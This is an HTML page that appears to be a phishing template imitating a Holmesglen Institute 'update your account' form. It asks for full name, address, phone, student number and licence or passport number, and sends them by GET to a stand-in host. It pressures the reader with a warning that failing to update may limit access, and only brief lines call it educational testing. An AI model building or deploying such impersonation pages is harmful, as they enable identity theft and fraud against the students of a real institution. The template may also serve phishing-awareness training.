<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Holmesglen Institute - Update Details</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="header">
            Holmesglen Institute
            <div class="sub-header">Update Your Account Information</div>
        </div>

        <p class="notice">For testing and educational purposes only. Do not enter real information.</p>

        <form action="https://example.com/update" method="get"> <!-- Changed to GET -->
            <label for="fullname">Full Name:</label>
            <input type="text" id="fullname" name="fullname" required>

            <label for="address">Address:</label>
            <input type="text" id="address" name="address" required>

            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" required>

            <label for="student">Student Number:</label>
            <input type="text" id="student" name="student" required>

            <label for="passport">License/Passport Number:</label>
            <input type="text" id="passport" name="passport" required>

            <button type="submit">Submit</button>
        </form>

        <div class="important">
            Important: Ensure your details are accurate. Failure to update may limit access.
        </div>

        <footer>
            This page is for educational testing purposes only and is not affiliated with Holmesglen.
        </footer>
    </div>

</body>
</html>
